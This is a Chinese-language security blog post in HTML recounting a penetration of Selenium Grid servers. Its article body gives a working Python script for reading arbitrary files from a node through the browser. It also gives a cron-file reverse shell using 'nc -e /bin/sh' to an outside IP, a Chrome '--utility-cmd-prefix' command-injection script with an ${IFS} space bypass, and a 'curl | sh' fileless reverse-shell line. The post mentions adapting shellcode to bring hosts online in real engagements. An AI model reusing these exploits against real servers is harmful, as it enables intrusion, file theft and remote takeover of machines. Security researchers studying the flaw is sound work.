@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>记一次曲折渗透selenium-server | hungry and humble</title>
+    
+    
+        <meta name="keywords" content="java" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="selenium server本地环境部署chromedriver放在该目录下，最好使用绝对路径 12345启动hub节点java -Dwebdriver.chrome.driver&#x3D;.&#x2F;chromedriver.exe -jar selenium-server-standalone-3.141.59.jar -role hub启动node节点 可起多个java -jar se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次曲折渗透selenium-server">
+<meta property="og:url" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="selenium server本地环境部署chromedriver放在该目录下，最好使用绝对路径 12345启动hub节点java -Dwebdriver.chrome.driver&#x3D;.&#x2F;chromedriver.exe -jar selenium-server-standalone-3.141.59.jar -role hub启动node节点 可起多个java -jar se">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/1.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/2.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/3.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/4.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/5.png">
+<meta property="og:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/6.png">
+<meta property="article:published_time" content="2021-11-25T12:27:23.000Z">
+<meta property="article:modified_time" content="2021-11-25T12:41:45.086Z">
+<meta property="article:author" content="G7shot">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://little-gu.github.io/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/1.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="hungry and humble" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/ckrie.jpg" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">hungry and humble</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">index</a>
+                
+                    <a class="main-nav-link" href="/archives">archives</a>
+                
+                    <a class="main-nav-link" href="/about">about</a>
+                
+                    <a class="main-nav-link" href="/notes">notes</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">index</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">about</a></td>
+                
+                    <td><a class="main-nav-link" href="/notes">notes</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            PHP代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/13/zzzcms/">zzzcms前台RCE</a></li>  <li class="file"><a href="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">审计某cms到insert注入技巧</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            java
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/16/cc1%E9%93%BE/">cc1链</a></li>  <li class="file"><a href="/2021/03/19/cc2%E9%93%BE/">cc2链</a></li>  <li class="file"><a href="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">结合两条cc链分析ysoserial实现</a></li>  <li class="file"><a href="/2021/04/19/cc5%E9%93%BE/">cc5链</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            注入
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/">mssql注入getshell</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            渗透
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">non-rce-ctf复现</a></li>  <li class="file active"><a href="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/">记一次曲折渗透selenium-server</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/2021/02/13/test/">test</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-记一次曲折渗透selenium-server" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/">
+            <time datetime="2021-11-25T12:27:23.000Z" itemprop="datePublished">2021-11-25</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/记一次曲折渗透selenium-server.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/记一次曲折渗透selenium-server.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/记一次曲折渗透selenium-server.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            记一次曲折渗透selenium-server
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <h2 id="selenium-server本地环境部署"><a href="#selenium-server本地环境部署" class="headerlink" title="selenium server本地环境部署"></a>selenium server本地环境部署</h2><p>chromedriver放在该目录下，最好使用绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启动hub节点</span><br><span class="line">java -Dwebdriver.chrome.driver&#x3D;.&#x2F;chromedriver.exe -jar selenium-server-standalone-3.141.59.jar -role hub</span><br><span class="line">启动node节点 可起多个</span><br><span class="line">java -jar selenium-server-standalone-3.141.59.jar -role node -port 5556 -hub (hub节点的机器)</span><br><span class="line">ps:不启动node节点的情况无法RCE</span><br></pre></td></tr></table></figure>
+<p>攻击只会攻击node节点的机器，hub节点的机器不会被攻击。</p>
+<p>目前环境：<br>win7 chrome 86.0.4240.75<br>hub节点：localhost:4444<br>node节点：localhost:5556</p>
+<h3 id="三种启动模式"><a href="#三种启动模式" class="headerlink" title="三种启动模式"></a>三种启动模式</h3><ul>
+<li>普通模式：负责接收远程Selenium客户端发送的指令，并执行该指令。</li>
+</ul>
+<ul>
+<li>Hub模式：组建Selenium Grid时，作为中心管理服务，负责接收本地或远程Selenium客户端发送的指令，并将指令分发给Node。</li>
+</ul>
+<ul>
+<li>Node模式：组建Selenium Grid时，作为节点服务，负责接收Hub发送的指令，并执行该指令。</li>
+</ul>
+<p>两种启动方式</p>
+<p>1.参数配置，命令行启动<br>2.配置文件方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 启动hub</span><br><span class="line">java -jar selenium-server-standalone-3.141.59.jar -role hub -hubConfig hub.json</span><br><span class="line"># 启动node</span><br><span class="line">java -jar selenium-server-standalone-3.141.59.jar -role node -hub http:&#x2F;&#x2F;localhost:4444&#x2F;grid&#x2F;register -nodeConfig node.json</span><br></pre></td></tr></table></figure>
+<p>配置node.json和hub.json(目标机器就是通过这中方式启动的，/grid/console中可以看见)<br>开启Selenium Server交互模式的命令为“java -jar selenium-server.jar -interactive”</p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>通过调用浏览器使用file协议读取本地文件，实战中最好加上以下参数。</p>
+<p>设置参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">options.add_argument(&quot;--no-sandbox&quot;)</span><br><span class="line">options.add_argument(&#39;--headless&#39;)</span><br></pre></td></tr></table></figure>
+<p>我在另外一台linux机器起一个node节点服务（谷歌版本和chromedriver版本和hub节点的不一致），最终还是会读取到文件。<br><img src="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/1.png" alt="1"></p>
+<p>利用python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver,common</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hub_url, remote_file, browser = <span class="literal">None</span>, <span class="literal">None</span>, <span class="string">&#x27;chrome&#x27;</span></span><br><span class="line">myopts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&#x27;:h:r:b:&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> o, a <span class="keyword">in</span> myopts:</span><br><span class="line">    <span class="keyword">if</span> o == <span class="string">&#x27;-h&#x27;</span>:</span><br><span class="line">        hub_url = a</span><br><span class="line">    <span class="keyword">elif</span> o == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">        remote_file = a</span><br><span class="line">    <span class="keyword">elif</span> o == <span class="string">&#x27;-b&#x27;</span>:</span><br><span class="line">        browser = a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Nothing special about the driver here. Probably would work on any browser</span></span><br><span class="line"><span class="comment">#chrome_options =Options()</span></span><br><span class="line"><span class="comment">#chrome_options.add_argument(&#x27;--no-sandbox&#x27;)</span></span><br><span class="line"><span class="comment">#chrome_options.add_argument(&#x27;--disable-dev-shm-usage&#x27;)</span></span><br><span class="line"><span class="comment">#chrome_options.add_argument(&#x27;--headless&#x27;)</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">driver = webdriver.Remote(</span><br><span class="line">   command_executor=hub_url,</span><br><span class="line">   desired_capabilities=&#123;<span class="string">&#x27;browserName&#x27;</span>: browser&#125;,options=options,</span><br><span class="line">   )</span><br><span class="line"><span class="comment"># Just get the local file and print it.</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver.get(<span class="string">&#x27;file://%s&#x27;</span> % (remote_file))</span><br><span class="line">    print(driver.page_source)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    driver.quit()</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="文件上传写计划任务"><a href="#文件上传写计划任务" class="headerlink" title="文件上传写计划任务"></a>文件上传写计划任务</h2><p>其原理就是通过控制浏览器的下载路径配合SSRF实现写入计划任务。</p>
+<p>首先看一下能否写入成功，经过测试，在无头模式下是可以下载文件到指定目录的，也就实现了文件上传</p>
+<p><img src="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/2.png" alt="2"></p>
+<p><img src="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/3.png" alt="3"><br>目标为linux环境的话可直接写入计划任务，本地测试时kali下权限都必须都是root权限，其他linux没测试过。</p>
+<p>echo  “* * * * * root nc -e /bin/sh 172.16.250.1 8888” &gt; /etc/cron.d/2<br>ps:要加username字段并且不需要赋予权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;crontab 可能有权限的问题，centos不受影响</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centos系统下root用户的cron文件</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debian系统下root用户的cron文件</span><br></pre></td></tr></table></figure>
+<h2 id="SSRF-利用chrome-rce"><a href="#SSRF-利用chrome-rce" class="headerlink" title="SSRF 利用chrome rce"></a>SSRF 利用chrome rce</h2><p>条件：<br>1.Chrome版本低于89.0.4389.114，/grid/console能查看版本<br>2.本地测试需要是headless模式下，并且需要开启–no-sandbox<br>3.目标机器出网（爬虫服务器一般都会出）</p>
+<p>发送请求过多会导致超时，应该是本地只开了一个节点的问题。<br>这个是非必要条件：option.add_experimental_option(“detach”, True)  设置不退出浏览器参数</p>
+<p>写了个java利用小工具</p>
+<p><img src="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/4.png" alt="4"><br><img src="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/5.png" alt="5"></p>
+<p>这里只是弹了个计算机，实战修改shellcode上线就可以。</p>
+<h2 id="Chrome-参数注入–-gt-RCE"><a href="#Chrome-参数注入–-gt-RCE" class="headerlink" title="Chrome 参数注入–&gt;RCE"></a>Chrome 参数注入–&gt;RCE</h2><p>只需要添加参数chrome_options.add_argument(“–utility-cmd-prefix=”+payload)就可以实现。<br>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.desired_capabilities <span class="keyword">import</span> DesiredCapabilities</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;/bin/bash -c touch$&#123;IFS&#125;/var/hahah&#x27;</span></span><br><span class="line"><span class="comment"># payload = &#x27;/bin/bash -c ping$&#123;IFS&#125;-c$&#123;IFS&#125;1$&#123;IFS&#125;fpu3zw.dnslog.cn #&#x27;</span></span><br><span class="line"><span class="comment"># execute chrome arguments</span></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&quot;--utility-and-browser&quot;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&quot;--utility-cmd-prefix=&quot;</span>+payload)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&quot;--user-agent=&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">driver = webdriver.Remote(</span><br><span class="line">   command_executor=<span class="string">&#x27;http://192.168.175.130:4444/wd/hub&#x27;</span>,</span><br><span class="line">   desired_capabilities=DesiredCapabilities.CHROME,</span><br><span class="line">   options=chrome_options</span><br><span class="line">)</span><br><span class="line">driver.get(<span class="string">&quot;https://baidu.com&quot;</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>
+<p>但是执行命令目标为linux环境时命令中的空格需要通过${IFS}绕过，或者编码一下(<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a>)</p>
+<p>不足就是会一直执行该命令,解决方法是通过python编写一个socket起一个服务请求一次就断开<br>curl <a target="_blank" rel="noopener" href="http://ip:9999/">http://ip:9999</a> | sh 不落地反弹shell</p>
+<p>这里Windows测试更为直观，实战环境是Linux直接反弹shell。<br><img src="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/6.png" alt="6"></p>
+<p>windows下尝试%CommonProgramFiles:~10,1%绕过空格不行，目前只能以绝对路径执行文件，可以配合文件下载直接上线cs。</p>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+    
+        <a href="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">non-rce-ctf复现</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            G7shot &copy; 2021 
+            <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by g7shot.com</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
